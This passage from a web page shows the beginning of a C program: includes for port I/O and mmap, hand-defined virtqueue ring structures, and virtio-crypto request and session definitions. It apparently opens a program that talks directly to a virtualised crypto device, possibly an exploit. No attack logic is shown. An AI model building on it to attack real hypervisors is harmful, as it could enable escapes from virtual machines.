class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingAvail</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">uint16_t</span> flags;<br>  <span class="hljs-type">uint16_t</span> idx;<br>  <span class="hljs-type">uint16_t</span> ring[];<br>&#125;VRingAvail;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VRingDesc</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span> addr;<br>    <span class="hljs-type">uint32_t</span> len;<br>    <span class="hljs-type">uint16_t</span> flags;<br>    <span class="hljs-type">uint16_t</span> next;<br>&#125; VRingDesc;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_op_header</span> &#123;</span><br>	<span class="hljs-type">uint32_t</span> opcode;<br>	<span class="hljs-comment">/* algo should be service-specific algorithms */</span><br>	<span class="hljs-type">uint32_t</span> algo;<br>	<span class="hljs-comment">/* session_id should be service-specific algorithms */</span><br>	<span class="hljs-type">uint64_t</span> session_id;<br>	<span class="hljs-comment">/* control flag to control the request */</span><br>	<span class="hljs-type">uint32_t</span> flag;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_cipher_para</span> &#123;</span><br><br>	<span class="hljs-type">uint32_t</span> iv_len;<br>	<span class="hljs-comment">/* length of source data */</span><br>	<span class="hljs-type">uint32_t</span> src_data_len;<br>	<span class="hljs-comment">/* length of dst data */</span><br>	<span class="hljs-type">uint32_t</span> dst_data_len;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_hash_para</span> &#123;</span><br>	<span class="hljs-comment">/* length of source data */</span><br>	<span class="hljs-type">uint32_t</span> src_data_len;<br>	<span class="hljs-comment">/* hash result length */</span><br>	<span class="hljs-type">uint32_t</span> hash_result_len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_mac_para</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_hash_para</span> <span class="hljs-title">hash</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_aead_para</span> &#123;</span><br>	<span class="hljs-type">uint32_t</span> iv_len;<br>	<span class="hljs-comment">/* length of additional auth data */</span><br>	<span class="hljs-type">uint32_t</span> aad_len;<br>	<span class="hljs-comment">/* length of source data */</span><br>	<span class="hljs-type">uint32_t</span> src_data_len;<br>	<span class="hljs-comment">/* length of dst data */</span><br>	<span class="hljs-type">uint32_t</span> dst_data_len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_cipher_data_req</span> &#123;</span><br>	<span class="hljs-comment">/* Device-readable part */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_cipher_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">24</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_hash_data_req</span> &#123;</span><br>	<span class="hljs-comment">/* Device-readable part */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_hash_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">40</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_mac_data_req</span> &#123;</span><br>	<span class="hljs-comment">/* Device-readable part */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_mac_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">40</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_alg_chain_data_para</span> &#123;</span><br>	<span class="hljs-type">uint32_t</span> iv_len;<br>	<span class="hljs-comment">/* Length of source data */</span><br>	<span class="hljs-type">uint32_t</span> src_data_len;<br>	<span class="hljs-comment">/* Length of destination data */</span><br>	<span class="hljs-type">uint32_t</span> dst_data_len;<br>	<span class="hljs-comment">/* Starting point for cipher processing in source data */</span><br>	<span class="hljs-type">uint32_t</span> cipher_start_src_offset;<br>	<span class="hljs-comment">/* Length of the source data that the cipher will be computed on */</span><br>	<span class="hljs-type">uint32_t</span> len_to_cipher;<br>	<span class="hljs-comment">/* Starting point for hash processing in source data */</span><br>	<span class="hljs-type">uint32_t</span> hash_start_src_offset;<br>	<span class="hljs-comment">/* Length of the source data that the hash will be computed on */</span><br>	<span class="hljs-type">uint32_t</span> len_to_hash;<br>	<span class="hljs-comment">/* Length of the additional auth data */</span><br>	<span class="hljs-type">uint32_t</span> aad_len;<br>	<span class="hljs-comment">/* Length of the hash result */</span><br>	<span class="hljs-type">uint32_t</span> hash_result_len;<br>	<span class="hljs-type">uint32_t</span> reserved;<br>&#125;;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_alg_chain_data_req</span> &#123;</span><br>	<span class="hljs-comment">/* Device-readable part */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_alg_chain_data_para</span> <span class="hljs-title">para</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_sym_data_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_cipher_data_req</span> <span class="hljs-title">cipher</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_alg_chain_data_req</span> <span class="hljs-title">chain</span>;</span><br>		<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">40</span>];<br>	&#125; u;<br><br>	<span class="hljs-comment">/* See above VIRTIO_CRYPTO_SYM_OP_* */</span><br>	<span class="hljs-type">uint32_t</span> op_type;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_aead_data_req</span> &#123;</span><br>	<span class="hljs-comment">/* Device-readable part */</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_aead_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">32</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_akcipher_para</span> &#123;</span><br>	<span class="hljs-type">uint32_t</span> src_data_len;<br>	<span class="hljs-type">uint32_t</span> dst_data_len;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_akcipher_data_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_akcipher_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">40</span>];<br>&#125;;<br><br><span class="hljs-comment">/* The request of the data virtqueue&#x27;s packet */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_op_data_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_op_header</span> <span class="hljs-title">header</span>;</span><br><br>	<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_sym_data_req</span>  <span class="hljs-title">sym_req</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_hash_data_req</span> <span class="hljs-title">hash_req</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_mac_data_req</span> <span class="hljs-title">mac_req</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_aead_data_req</span> <span class="hljs-title">aead_req</span>;</span><br>		<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_akcipher_data_req</span> <span class="hljs-title">akcipher_req</span>;</span><br>		<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">48</span>];<br>	&#125; u;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_CIPHER 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_HASH   1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_MAC    2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_AEAD   3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_SERVICE_AKCIPHER 4</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_OPCODE(service, op)   (((service) &lt;&lt; 8) | (op))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_CREATE_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_CIPHER, 0x02)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_DESTROY_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_CIPHER, 0x03)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_CREATE_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_HASH, 0x02)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_DESTROY_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_HASH, 0x03)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_CREATE_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_MAC, 0x02)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_MAC_DESTROY_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_MAC, 0x03)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AEAD_CREATE_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AEAD, 0x02)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AEAD_DESTROY_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AEAD, 0x03)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_CREATE_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AKCIPHER, 0x04)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_AKCIPHER_DESTROY_SESSION \</span><br><span class="hljs-meta">	   VIRTIO_CRYPTO_OPCODE(VIRTIO_CRYPTO_SERVICE_AKCIPHER, 0x05)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_ctrl_header</span> &#123;</span><br>	<span class="hljs-type">uint32_t</span> opcode;<br>	<span class="hljs-type">uint32_t</span> algo;<br>	<span class="hljs-type">uint32_t</span> flag;<br>	<span class="hljs-comment">/* data virtqueue id */</span><br>	<span class="hljs-type">uint32_t</span> queue_id;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_cipher_session_para</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_NO_CIPHER                 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_ARC4               1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_AES_ECB            2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_AES_CBC            3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_AES_CTR            4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_DES_ECB            5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_DES_CBC            6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_3DES_ECB           7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_3DES_CBC           8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_3DES_CTR           9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_KASUMI_F8          10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_SNOW3G_UEA2        11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_AES_F8             12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_AES_XTS            13</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_CIPHER_ZUC_EEA3           14</span><br>	<span class="hljs-type">uint32_t</span> algo;<br>	<span class="hljs-comment">/* length of key */</span><br>	<span class="hljs-type">uint32_t</span> keylen;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_OP_ENCRYPT  1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_OP_DECRYPT  2</span><br>	<span class="hljs-comment">/* encrypt or decrypt */</span><br>	<span class="hljs-type">uint32_t</span> op;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_session_input</span> &#123;</span><br>	<span class="hljs-comment">/* Device-writable part */</span><br>	<span class="hljs-type">uint64_t</span> session_id;<br>	<span class="hljs-type">uint32_t</span> status;<br>	<span class="hljs-type">uint32_t</span> padding;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_cipher_session_req</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_cipher_session_para</span> <span class="hljs-title">para</span>;</span><br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">32</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">virtio_crypto_hash_session_para</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_NO_HASH            0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_MD5           1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA1          2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA_224       3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA_256       4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA_384       5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA_512       6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA3_224      7</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA3_256      8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA3_384      9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA3_512      10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA3_SHAKE128      11</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VIRTIO_CRYPTO_HASH_SHA3_SHAKE256      12</span><br>	<span class="hljs-type">uint32_t</span> algo;<br>	<span class="hljs-comment">/* hash result length */</span><br>	<span class="hljs-type">uint32_t</span> hash_result_len;<br>	<span class="hljs-type">uint8_t</span> padding[<span class="hljs-number">8</span>];<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span 